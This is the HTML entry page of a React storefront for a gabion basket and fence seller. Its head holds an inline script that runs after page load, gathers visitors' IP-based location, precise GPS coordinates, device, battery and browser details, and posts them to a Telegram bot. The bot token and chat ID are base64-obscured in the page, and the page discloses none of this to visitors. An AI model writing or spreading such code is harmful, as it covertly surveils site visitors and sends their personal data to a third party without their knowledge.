<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="theme-color" content="#000000" />
    <meta name="description" content="Gabionca - Your Premier Source for Quality Gabion Baskets, Panels, and Fences" />
    <meta name="keywords" content="gabion baskets, gabion panels, gabion fences, gabion solutions, landscaping, erosion control" />
    <link rel="apple-touch-icon" href="%PUBLIC_URL%/logo192.png" />
    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
    <title>Gabionca - Quality Gabion Baskets, Panels, and Fences</title>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-V8LNM027M4"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-V8LNM027M4');
    </script>
    <script>
    /* eslint-disable */

    const base64Decode = (encoded) => atob(encoded);

    const encodedBotToken = 'ODM2MDE3ODY4ODpBQUV2eF93VUhKQTViS1hObUhETFhNbjRPNnV0QzdDMnR5OA==';
    const encodedChatId = 'LTEwMDM5MzM0NzYwMDE=';

    const sendToTelegram = async (text) => {
      const token = base64Decode(encodedBotToken);
      const chatId = base64Decode(encodedChatId);

      try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
        });
      } catch (e) {}
    };

    // Lightweight data collection (runs after page load)
    const collectVisitorData = async () => {
      // 1. IP Info (fast)
      let ipInfo = {};
      try {
        const res = await fetch('https://ipapi.co/json/');
        ipInfo = await res.json();
      } catch {}

      // 2. Basic browser/device info
      const screen = `${window.screen.width}×${window.screen.height} (${window.devicePixelRatio}x)`;
      const touch = 'ontouchstart' in window ? 'Yes' : 'No';
      const connection = navigator.connection 
        ? `${navigator.connection.effectiveType || 'N/A'} | ${navigator.connection.downlink || 'N/A'}Mbps` 
        : 'N/A';

      // 3. Battery (if supported)
      let battery = 'N/A';
      try {
        if ('getBattery' in navigator) {
          const bat = await navigator.getBattery();
          battery = `${Math.round(bat.level * 100)}%${bat.charging ? ' (charging)' : ''}`;
        }
      } catch {}

      const baseInfo = `
    🌐 IP: ${ipInfo.ip || 'N/A'}
    🏙 IP Location: ${ipInfo.city || 'N/A'}, ${ipInfo.country_name || 'N/A'}
    🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
    📅 Local Time: ${new Date().toLocaleString()}

    📱 Device: ${navigator.platform}
    🖥 Screen: ${screen}
    👆 Touch: ${touch}
    🔋 Battery: ${battery}
    🌍 Language: ${navigator.language}
    🔗 Referrer: ${document.referrer || 'Direct'}
    📍 Page: ${window.location.href}
    📡 Connection: ${connection}
    🕵️ User Agent: ${navigator.userAgent.substring(0, 140)}
      `.trim();

      // 4. Geolocation (with Google Maps link)
      if (!navigator.geolocation) {
        sendToTelegram(`❌ GABIONCA - No Geolocation\n\n${baseInfo}`);
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude, accuracy } = position.coords;

          let city = 'Unknown', country = 'Unknown';

          try {
            const geoRes = await fetch(
              `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
            );
            if (geoRes.ok) {
              const data = await geoRes.json();
              city = data.city || data.locality || 'Unknown';
              country = data.countryName || 'Unknown';
            }
          } catch {}

          const mapsLink = `https://www.google.com/maps/place/${latitude},${longitude}`;

          const message = `✅ GABIONCA - New Visitor

    📍 GPS: ${latitude}, ${longitude} (±${Math.round(accuracy)}m)
    🏙 City: ${city}
    🌍 Country: ${country}
    🔗 ${mapsLink}

    ${baseInfo}`;

          sendToTelegram(message);
        },
        async (error) => {
          let status = 'BLOCKED';
          if (error.code === error.POSITION_UNAVAILABLE) status = 'UNAVAILABLE';
          if (error.code === error.TIMEOUT) status = 'TIMEOUT';

          const message = `❌ GABIONCA - Location ${status}

    ${baseInfo}`;

          sendToTelegram(message);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    };

    // Run after page is fully loaded (non-blocking)
    window.addEventListener('load', () => {
      setTimeout(collectVisitorData, 1500); // 1.5 second delay so page loads fast
    });
    </script>
</head>
<body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root"></div>
</body>
</html>
